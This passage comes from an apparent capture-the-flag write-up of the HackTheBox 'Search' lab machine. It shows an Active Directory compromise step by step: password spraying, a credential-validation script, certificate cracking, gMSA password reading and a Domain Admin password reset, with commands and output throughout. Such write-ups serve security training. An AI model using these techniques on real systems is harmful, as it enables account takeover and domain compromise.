{Redacted}
{Redacted}
```

- Password spraying via CrackMapExec (CME):

> Note: You can also do this in LDAP.

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:39:18(HKT)]
└> crackmapexec smb $RHOSTS -u domain_users.txt -p domain_users_password.txt --continue-on-success
[...]
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
[...]
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\web_svc:{Redacted}
[...]
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Hope.Sharp:{Redacted}
[...]
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:{Redacted} 
```

**Nice! We found domain user `Edgar.Jacobs` is reusing `web_svc` password!!**

In the previous `ldapdomaindump`, we found that domain user `Edgar.Jacobs` is a member of `London-HelpDesk` group, and it doesn't have anything interesting for us.

**Then, I decided to enumerate `Edgar.Jacobs` user profile in SMB share `RedirectedFolders$`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:45:57(HKT)]
└> smbclient //search.htb/RedirectedFolders$ -U "Edgar.Jacobs"
Password for [WORKGROUP\Edgar.Jacobs]:
Try "help" to get a list of possible commands.
smb: \> cd edgar.jacobs\
smb: \edgar.jacobs\> dir
  .                                  Dc        0  Fri Apr 10 04:04:11 2020
  ..                                 Dc        0  Fri Apr 10 04:04:11 2020
  Desktop                           DRc        0  Mon Aug 10 18:02:16 2020
  Documents                         DRc        0  Mon Aug 10 18:02:17 2020
  Downloads                         DRc        0  Mon Aug 10 18:02:17 2020
smb: \edgar.jacobs\> dir Desktop\
  .                                 DRc        0  Mon Aug 10 18:02:16 2020
  ..                                DRc        0  Mon Aug 10 18:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Fri Apr 10 04:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 18:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Fri Apr 10 04:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 18:35:44 2020
```

**Oh! What's that `Phishing_Attempt.xlsx` Excel file? Let's `get` it:**
```shell
smb: \edgar.jacobs\> get Desktop\Phishing_Attempt.xlsx 
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:46:41(HKT)]
└> mv Desktop\\Phishing_Attempt.xlsx Phishing_Attempt.xlsx
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:46:41(HKT)]
└> file Phishing_Attempt.xlsx 
Phishing_Attempt.xlsx: Microsoft Excel 2007+
```

**Then, open it in Excel: (I'll be using LibreOffice Calc in Linux)**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727165600.png)

In the "Passwords 01082020" tab, some domain users' password are captured via phishing attack.

**Also, column C is hidden:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727165858.png)

**However, this tab is protected with password:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727170340.png)

In "Captured" tab, it shows the captured passwords graph, as well as a weird text: `IT ChangeOver Keely Lyons Started`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727165718.png)

Now, luckily, I found [this blog](https://www.myonlinetraininghub.com/easily-remove-excel-password-protection), so that we can unprotect the worksheet.

**Since `.xlsx` files is just a ZIP compressed file, we can unzip it:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|17:07:43(HKT)]
└> unzip Phishing_Attempt.xlsx 
Archive:  Phishing_Attempt.xlsx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/worksheets/sheet2.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/drawings/drawing1.xml  
  inflating: xl/charts/chart1.xml    
  inflating: xl/charts/style1.xml    
  inflating: xl/charts/colors1.xml   
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/_rels/sheet2.xml.rels  
  inflating: xl/drawings/_rels/drawing1.xml.rels  
  inflating: xl/charts/_rels/chart1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: xl/printerSettings/printerSettings2.bin  
  inflating: xl/calcChain.xml        
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
```

**Then edit `xl/worksheets/sheet2.xml`, which is the protected worksheet:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727171527.png)

**Delete `<sheetProtection>` tag:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727171539.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727171547.png)

**Save and `zip` it back:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|17:18:43(HKT)]
└> zip -r Phishing_Attempt_modified.xlsx xl/ docProps/ '[Content_Types].xml' _rels/
  adding: xl/ (stored 0%)
  adding: xl/workbook.xml (deflated 60%)
  adding: xl/styles.xml (deflated 89%)
  adding: xl/charts/ (stored 0%)
  adding: xl/charts/style1.xml (deflated 90%)
  adding: xl/charts/chart1.xml (deflated 77%)
  adding: xl/charts/colors1.xml (deflated 73%)
  adding: xl/charts/_rels/ (stored 0%)
  adding: xl/charts/_rels/chart1.xml.rels (deflated 49%)
  adding: xl/worksheets/ (stored 0%)
  adding: xl/worksheets/sheet1.xml (deflated 79%)
  adding: xl/worksheets/sheet2.xml (deflated 73%)
  adding: xl/worksheets/_rels/ (stored 0%)
  adding: xl/worksheets/_rels/sheet2.xml.rels (deflated 42%)
  adding: xl/worksheets/_rels/sheet1.xml.rels (deflated 55%)
  adding: xl/sharedStrings.xml (deflated 55%)
  adding: xl/drawings/ (stored 0%)
  adding: xl/drawings/drawing1.xml (deflated 58%)
  adding: xl/drawings/_rels/ (stored 0%)
  adding: xl/drawings/_rels/drawing1.xml.rels (deflated 39%)
  adding: xl/_rels/ (stored 0%)
  adding: xl/_rels/workbook.xml.rels (deflated 74%)
  adding: xl/calcChain.xml (deflated 55%)
  adding: xl/printerSettings/ (stored 0%)
  adding: xl/printerSettings/printerSettings1.bin (deflated 67%)
  adding: xl/printerSettings/printerSettings2.bin (deflated 67%)
  adding: xl/theme/ (stored 0%)
  adding: xl/theme/theme1.xml (deflated 80%)
  adding: docProps/ (stored 0%)
  adding: docProps/app.xml (deflated 52%)
  adding: docProps/core.xml (deflated 47%)
  adding: [Content_Types].xml (deflated 79%)
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 60%)
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727171933.png)

Now the protection is gone!

**Let's unhide column C:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727172047.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727172105.png)

Nice!

**Again, we can verify those credentials are valid or not:**
```python
#!/usr/bin/env python3
from os import system

if __name__ == '__main__':
    RHOSTS = '10.10.11.129'
    domainUsers = {
        'hope.sharp': '{Redacted}',
        'Edgar.Jacobs': '{Redacted}',
        'Payton.Harmon': '{Redacted}',
        'Cortez.Hickman': '{Redacted}',
        'Bobby.Wolf': '{Redacted}',
        'Margaret.Robinson': '{Redacted}',
        'Scarlett.Parks': '{Redacted}',
        'Eliezer.Jordan': '{Redacted}',
        'Hunter.Kirby': '{Redacted}',
        'Sierra.Frye': '{Redacted}',
        'Annabelle.Wells': '{Redacted}',
        'Eve.Galvan': '{Redacted}',
        'Jeramiah.Fritz': '{Redacted}',
        'Abby.Gonzalez': '{Redacted}',
        'Joy.Costa': '{Redacted}',
        'Vincent.Sutton': '{Redacted}',
        'web_svc': '{Redacted}'
    }

    for user, password in domainUsers.items():
        system(f"crackmapexec smb {RHOSTS} -u '{user}' -p '{password}'")
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|17:37:09(HKT)]
└> python3 validate_domain_users.py
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:{Redacted} 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:{Redacted} 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Bobby.Wolf:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Margaret.Robinson:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Scarlett.Parks:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eliezer.Jordan:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Hunter.Kirby:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:{Redacted}  
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Annabelle.Wells:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eve.Galvan:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jeramiah.Fritz:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Abby.Gonzalez:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Joy.Costa:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Vincent.Sutton:{Redacted}  STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\web_svc:{Redacted} 
```

As you can see, only domain user `Sierra.Frye`'s password haven't changed yet, thus it's valid credentials.

**Again, we can enumerate the SMB `RedirectedFolders$` share with `Sierra.Frye`'s credentials:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|17:42:32(HKT)]
└> smbclient //search.htb/RedirectedFolders$ -U "Sierra.Frye"
Password for [WORKGROUP\Sierra.Frye]:
Try "help" to get a list of possible commands.
smb: \> cd sierra.frye\
smb: \sierra.frye\> dir
  .                                  Dc        0  Thu Nov 18 09:01:46 2021
  ..                                 Dc        0  Thu Nov 18 09:01:46 2021
  Desktop                           DRc        0  Thu Nov 18 09:08:00 2021
  Documents                         DRc        0  Fri Jul 31 22:42:19 2020
  Downloads                         DRc        0  Fri Jul 31 22:45:36 2020
  user.txt                           Ac       33  Thu Nov 18 08:55:27 2021

		3246079 blocks of size 4096. 619588 blocks available
```

**Found `user.txt`! Let's `get` it:**
```shell
smb: \sierra.frye\> get user.txt 
[...]
```

**user.txt:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|17:39:04(HKT)]
└> cat user.txt  
{Redacted}
```

**Also, in `Sierra.Frye` domain user's profile, there's a `Backup` folder in `Downloads\`:**
```shell
smb: \sierra.frye\> cd Downloads\Backups\
smb: \sierra.frye\Downloads\Backups\> dir
  .                                 DHc        0  Tue Aug 11 04:39:17 2020
  ..                                DHc        0  Tue Aug 11 04:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 23:04:11 2020
  staff.pfx                          Ac     4326  Tue Aug 11 04:39:17 2020
```

**Download both of them:**
```shell
smb: \sierra.frye\Downloads\Backups\> mget *
Get file search-RESEARCH-CA.p12? y
[...]
Get file staff.pfx? y
[...]
```

After some researching, `.p12` extension is a file that contains a digital certificate that uses PKCS#12 (Public Key Cryptography Standard #12) encryption, and `.pfx` extension is a password protected file certificate.

Hmm... That being said, `staff.pfx` is interesting.

> **Note: We've seen `staff` in the web application.**

**In FireFox, we can import digital certificates via "Certificate Manager":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727175154.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727175202.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727175228.png)

As excepted, `staff.pfx` requires password.

**We can try to crack that via `pfx2john`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|17:54:14(HKT)]
└> pfx2john staff.pfx > staff_pfx.hash
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|17:55:06(HKT)]
└> pfx2john search-RESEARCH-CA.p12 > search-RESEARCH-CA_p12.hash
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|17:57:06(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt staff_pfx.hash 
[...]
{Redacted}        (staff.pfx)     
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|17:58:11(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt search-RESEARCH-CA_p12.hash
[...]
{Redacted}        (search-RESEARCH-CA.p12)     
```

Cracked!

**Then we can import both certificate:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727175902.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727175951.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727180154.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727180231.png)

I wonder what we can do with those certificates...

You guessed, the HTTPS port's web application's `/staff` page!

**When we visit `/staff` in HTTPS, it now shows this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727180528.png)

**Let's use the `staff.pfx` certificate:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727180558.png)

Oh wow! Looks like we can remotely connect to a PowerShell session!

**Let's use domain user `Sierra.Frye` to sign in:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727180859.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727180923.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727181624.png)

## Privilege Escalation

### Sierra.Frye to Tristan.Davies

**Next, we can use BloodHound's "Pathfinding" function to analysis what can we do with this domain user:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727174112.png)

Hmm... Domain user `Sierra.Frye` is a member of `ITSEC`, and it has `ReadGMSAPassword` privilege to gMSA, and gMSA has `GenericAll` privilege!

**When a group has `ReadGMSAPassword`, its members can read the gMSA (Group Managed Service Accounts) password of the account!**

According to [Microsoft](https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-group-managed), gMSA is to generate a really strong password (240-byte long) and reset the password every 30 days.

**Also, according to [this article](https://aadinternals.com/post/gmsa/), we can get the password via:**
```powershell
# Get BIR-ADFS-GMSA account:
$gmsa = Get-ADServiceAccount -Identity "BIR-ADFS-GMSA" -Properties "msDS-ManagedPassword"

# Parse blob
$passwordBlob = ConvertFrom-ADManagedPasswordBlob -Blob $gmsa.'msDS-ManagedPassword'
$currentPassword = $passwordBlob.CurrentPassword
$secureCurrentPassword = $passwordBlob.SecureCurrentPassword
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727184115.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727184423.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727185559.png)

**Now, we can use [`PSCredential`](https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8) to execute PowerShell commands as gMSA:**
```powershell
$credential = New-Object System.Management.Automation.PSCredential($gmsa.name, $secureCurrentPassword)
Invoke-Command -ComputerName 127.0.0.1 -Credential $credential -ScriptBlock {whoami}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727190520.png)

**Then, we can reset Domain Admin `Tristan.Davies`'s password because of the `GenericAll` right!**

> Note: `GenericAll` right means full rights to the object (add users to a group or reset user's password).

```powershell
Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity Tristan.Davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'FinallyPwnedThisAD!!GG' -force)} -Credential $credential
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727191202.png)

**Finally, we can use `wmiexec` or other tools to login as the Domain Admin with our new password:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|18:25:57(HKT)]
└> impacket-wmiexec research.search.htb/Tristan.Davies:'FinallyPwnedThisAD!!GG'@search.htb 
[...]
C:\>whoami
search\tristan.davies

C:\>ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Research
   Primary Dns Suffix  . . . . . . . : search.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : search.htb
                                       htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-EB-D4
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::ce(Preferred) 
   Lease Obtained. . . . . . . . . . : 27 July 2023 06:03:44
   Lease Expires . . . . . . . . . . : 27 July 2023 13:03:44
   IPv6 Address. . . . . . . . . . . : dead:beef::79e7:5550:1492:3709(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::79e7:5550:1492:3709%6(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.11.129(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ca8%6
                                       10.10.10.2
[...]
C:\>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                          Attributes                                                     
============================================= ================ ============================================ ===============================================================
Everyone                                      Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                        Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
SEARCH\Domain Admins                          Group            S-1-5-21-271492789-1610487937-1871574529-512 Mandatory group, Enabled by default, Enabled group             
[...]
SEARCH\Enterprise Admins                      Group            S-1-5-21-271492789-1610487937-1871574529-519 Mandatory group, Enabled by default, Enabled group             
SEARCH\Schema Admins                          Group            S-1-5-21-271492789-1610487937-1871574529-518 Mandatory group, Enabled by default, Enabled group             
[...]
```

## Rooted

**root.txt:**
```shell
C:\>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727191630.png)

## Conclusion

What we've learned:

1. Enumerating Active Directory Via LDAP
2. Enumerating Active Directory Via BloodHound
3. Kerberoasting & Cracking TGS Ticket
4. Password Spraying Via CrackMapExec
5. Unprotecting Excel File's Worksheet
6. Cracking Digital Certificates
7. Abusing `ReadGMSAPassword` Right To Read gMSA's Password
8. Abusing `GenericAll` To Reset Domain Admin's Password